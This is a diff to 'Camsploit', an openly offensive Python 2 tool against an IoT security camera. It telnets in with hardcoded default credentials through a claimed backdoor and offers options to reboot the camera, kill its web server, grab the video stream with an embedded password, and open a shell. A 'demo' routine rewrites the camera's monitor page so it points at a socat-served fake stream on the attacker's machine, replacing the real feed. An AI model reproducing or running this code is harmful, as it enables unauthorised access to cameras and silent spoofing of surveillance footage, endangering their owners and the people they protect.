@@ -1,6 +1,7 @@
 import os,sys,time,socket,subprocess,telnetlib
 LISTEN_PORT = 5000
-HOST = "10.100.100.13"  #Victim IOT Camera
+HOST = "0.0.0.0"  #Victim IOT Camera
+webpage = "monitor4.asp"
 user = "admin"
 password = "ipcam_rt"
 banner = """
@@ -21,10 +22,10 @@ Welcome!!!
 
 main = """Please Select an option:
 [1] Reboot Camera
-[2] Kill Feed
+[2] Kill Feed*
 [3] Grab Stream
 [4] Shell Session
-[5] Perform Reconnaisance
+[5] Perform Reconnaisance*
 [6]
 [7]
 [8]
@@ -32,7 +33,7 @@ main = """Please Select an option:
 
 [d] Debug
 [x] Demo
-[0,q] Exit
+[0] Exit
 """
 
 def loading(text):
@@ -46,9 +47,9 @@ def prompt():
     raw_input("Press ENTER to continue. ")
 
 def start_exploit():
-    loading("Accessing Backdoor")
-    loading("Crafting Exploit..")
-    loading("Sending Exploit...")
+    loading("Accessing Backdoor.........")
+    loading("Crafting Exploit...........")
+    loading("Sending Exploit............")
 
 
 
@@ -81,11 +82,8 @@ def reboot():
     connect()
     tn.write(command + "\n")
     tn.write("exit" + "\n")
-    tn.close()
-
-
-    print "Send reboot command"
     prompt()
+    tn.close()
         
 def kill():
     command = "/usr/bin/killall webs"
@@ -93,10 +91,13 @@ def kill():
     connect()
     tn.write(command + "\n")
     tn.write("exit" + "\n")
+    prompt()
     tn.close()
 
-def view():
+def grab():
+    print "grabbing stream"
     os.system("wget 'http://" + HOST + "/vjpeg.v?user=admin&pwd=Admin1234!' -O stream")
+    prompt()
 
 def shell():
     start_exploit()
@@ -106,12 +107,12 @@ def shell():
 def demo():
     self_ip = get_ip()
     FNULL = open(os.devnull, 'w')
-    command1 = "cp /www/monitor4.asp /www/monitor.asp.bak1" #Creates backup
-    command2 = "sed -i 's#/vjpeg.v#http://" + self_ip + ":4000#' /www/monitor4.asp && sed -i 's/pragma/refresh/' /www/monitor4.asp && sed -i 's/no-cache/7/' /www/monitor4.asp" #spoof stream
+    command1 = "cp /www/" + webpage + " /www/monitor.asp.bak1" #Creates backup
+    command2 = "sed -i 's#/vjpeg.v#http://" + self_ip + ":4000#' /www/" + webpage + " && sed -i 's/pragma/refresh/' /www/" + webpage + " && sed -i 's/no-cache/7/' /www/" + webpage #spoof stream
     command3 = "/root/start_web.sh" #restart webserver
-    command4 = "cp /www/monitor.asp.bak1 /www/monitor4.asp"
+    command4 = "cp /www/monitor.asp.bak1 /www/" + webpage
     loading("Creating Fake Stream Server")
-    os.system('socat TCP-LISTEN:4000,reuseaddr,fork EXEC:"pv -L 300k fakeheaders stream" &')
+    os.system('socat TCP-LISTEN:4000,reuseaddr,fork EXEC:"pv -L 300k fakeheaders stream" 2>/dev/null &')
     start_exploit()
     connect()
     tn.write(command1 + "\n")
@@ -128,11 +129,18 @@ def demo():
     os.system("killall socat")
 
 def recon():
-    print "Do some recon stuff"
+    print "Has not been implemented... yet"
+    prompt()
 
 def exit():
     print "Thank you for using Camsploit!"
     print "Happy hacking!!!!!"
+    try:
+        tn
+    except NameError:
+        sys.exit()
+    else:
+        tn.close()
     sys.exit()
 
 
@@ -178,7 +186,7 @@ menu_actions = {
     'main_menu': main_menu,
     '1': reboot,
     '2': kill,
-    '3': view,
+    '3': grab,
     '4': shell,
     '5': recon,
     'x': demo,
